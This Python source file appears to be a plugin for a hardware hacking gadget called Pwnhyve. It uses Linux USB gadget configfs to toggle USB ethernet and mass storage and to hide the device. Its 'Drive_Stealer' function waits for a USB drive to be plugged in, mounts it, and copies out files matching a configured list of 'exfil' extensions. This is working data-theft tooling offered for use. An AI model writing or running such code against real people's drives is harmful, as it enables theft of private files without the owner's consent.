import time
from PIL import ImageFont
import subprocess
import os
import random, string
from time import sleep
from core.plugin import BasePwnhyvePlugin
from core.utils import config

usbMounted = False
kernelGadgetDir = "/sys/kernel/config/usb_gadget/isticktoit/"
usbUDCDisabled = False
font = ImageFont.truetype('core/fonts/roboto.ttf', 14)
USBEthernetEnabled = os.path.exists("{}configs/c.1/rndis.usb0".format(kernelGadgetDir)) # ln -s functions/rndis.usb0 configs/c.1/

piusb = config["badusb"]["usbBin"]
mountFolder = config["badusb"]["mountFolder"]

class PWN_Gadget(BasePwnhyvePlugin):
    _icons = {
        "Toggle_USB_Ethernet": "./core/icons/eth.bmp",
        "Toggle_Mass_Storage": "./core/icons/usb.bmp",
        "Hide_USB_Device": "./core/icons/usb.bmp",
        "Drive_Stealer": "./core/icons/usb.bmp",
    }

    def Toggle_USB_Ethernet(tpil):
        global USBEthernetEnabled

        sc = tpil.gui.screenConsole(tpil)

        subprocess.getoutput("echo "" > {}UDC".format(kernelGadgetDir)) # udc off..

        if USBEthernetEnabled:
            sc.addText("Disconnecting ethernet..")

            subprocess.getoutput("rm -rf {}configs/c.1/rndis.usb0".format(kernelGadgetDir))

            sc.addText("Disconnected.")
        else:
            sc.addText("Connecting ethernet..")
            
            subprocess.getoutput("ln -s {}functions/rndis.usb0 {}configs/c.1/".format(kernelGadgetDir, kernelGadgetDir)) 
            
            sc.addText("Connected.")

        USBEthernetEnabled = not USBEthernetEnabled
        subprocess.getoutput("ls /sys/class/udc > {}UDC".format(kernelGadgetDir)) # back on after fix

        tpil.waitForKey()

    def Toggle_Mass_Storage(tpil):
        global usbMounted

        sc = tpil.gui.screenConsole(tpil)

        if usbMounted:
            sc.addText("Mounting mass storage\nfor reading...")

            subprocess.getoutput("echo \"\" > {}".format(kernelGadgetDir+"functions/mass_storage.usb0/lun.0/file"))
            subprocess.getoutput("umount {} -l".format(piusb)) # lazy unmount
            subprocess.getoutput("mount {} {}".format(piusb, mountFolder))

            sc.addText("Mounted. Access at {}".format(mountFolder))
        else:
            sc.addText("Unmounting mass storage..")
            
            subprocess.getoutput("umount {} -l".format(piusb)) # lazy unmount
            subprocess.getoutput("echo {} > {}".format(piusb, kernelGadgetDir+"functions/mass_storage.usb0/lun.0/file"))
            
            sc.addText("Unmounted.")

        usbMounted = not usbMounted
        tpil.waitForKey()

    def Hide_USB_Device(tpil):
        """i dont even know how i found this v2"""
        global kernelGadgetDir
        global usbUDCDisabled

        # disable udc (or the entire gadget)
        subprocess.getoutput("echo "" > {}UDC".format(kernelGadgetDir))

        if usbUDCDisabled:
            # remake mass storage function
            a = subprocess.getoutput("ln -s {}functions/mass_storage.usb0 {}configs/c.1/".format(kernelGadgetDir, kernelGadgetDir))

            print("enable storage")
        else:
            # turn off mass storage function
            a = subprocess.getoutput("rm -rf {}configs/c.1/mass_storage.usb0".format(kernelGadgetDir))

            print("disable storage")

        usbUDCDisabled = not usbUDCDisabled

        # turn udc back on
        subprocess.getoutput("ls /sys/class/udc > {}UDC".format(kernelGadgetDir))

    def Drive_Stealer(tpil):
        """auto mount from https://gist.github.com/slobdell/7d052e01fed005f387b1c8e4994cd6d1"""
        fileSearch = config["badusb"]["exfilFiles"]

        extractPoint = "/tmp/pwnhyveExtractedUsb"

        try:
            os.mkdir(extractPoint)
        except: pass

        handler = tpil.gui.screenConsole(tpil) # init handler

        handler.addText("creating mountdir")

        mkdirStr = ''.join([random.choice(string.ascii_letters) for _ in range(8)])

        MOUNT_DIR = "/mnt/{}".format(mkdirStr)

        foundFiles = {}

        os.mkdir(MOUNT_DIR)

        handler.addText("waiting for usb")

        sdaCommands = [
            "sudo fdisk -l | grep sda | grep -v Disk",
            "sudo fdisk -l | grep sdb | grep -v Disk"
        ]

        while True:
            output = None
            for x in sdaCommands:
                a = subprocess.getoutput(x)
                if len(a.strip("\n")) > 0:
                    output = a
                    continue

            if output is None: continue

            if tpil.checkIfKey():
                handler.addText("quitting")
                handler.exit()
                sleep(1)
                return
                
            if len(output) > 0: # i dont even know anymore
                output = output.split("\n")
                handler.addText("got usb; mounting")
                startTime = time.time_ns() / 1_000_000
                o = subprocess.getstatusoutput("mount %s %s" % (output[0].split(" ")[0], MOUNT_DIR))

                if o[0] != 0: 
                    print("error mounting: {}".format(o[1]))
                    handler.addText("error mounting the usb")
                    try:
                        os.rmdir(MOUNT_DIR)
                    except: print("couldn't remove mount dir")

                    print("sudo mount %s %s" % (output[0].split(" ")[0], MOUNT_DIR))

                    tpil.waitForKey()
                    handler.exit()

                    return

                print(output[0])
                print("sudo mount %s %s" % (output[0].split(" ")[0], MOUNT_DIR))
                break
            else:
                sleep(0.025)

        handler.addText("extracting {} files".format(len(fileSearch)))
        handler.addText("using find command")

        for item in fileSearch:
            foundFiles[item] = []
            files = subprocess.getoutput("find {} -type f".format(MOUNT_DIR)).splitlines()
            for file in files:
                fileName = file.split("/")[-1]
                extension = fileName.split(".")[-1]
                
                if "."+extension in fileSearch:
                    foundFiles[item].append(file)

        handler.addText("now copying")

        for fileType in foundFiles:
            for file in foundFiles[fileType]:
                subprocess.getoutput("cp \"{}\" \"{}\"".format(file, extractPoint))

        handler.addText("unmounting")

        subprocess.getoutput("sudo umount {}".format(output[0].split(" ")[0]))

        endTime = time.time_ns() / 1_000_000

        handler.addText("done")
        tpil.waitForKey()

        # just for easier reading
        b = 0
        for found in foundFiles:
            b += len(foundFiles[found])

        handler.text = "total files extracted: {}\nUSB target: {}\ntime taken: {}ms".format(b, output[0].split(" ")[0].strip(), round(endTime-startTime, 2))
        handler.update()

        tpil.waitForKey()

        handler.exit()
        
        try:
            os.rmdir(MOUNT_DIR)
            subprocess.getoutput("sudo rm -rf {}".format(MOUNT_DIR))
        except Exception as e: print("couldn't remove mount dir: {}".format(str(e))); subprocess.getoutput("sudo rm -rf {}".format(MOUNT_DIR))
        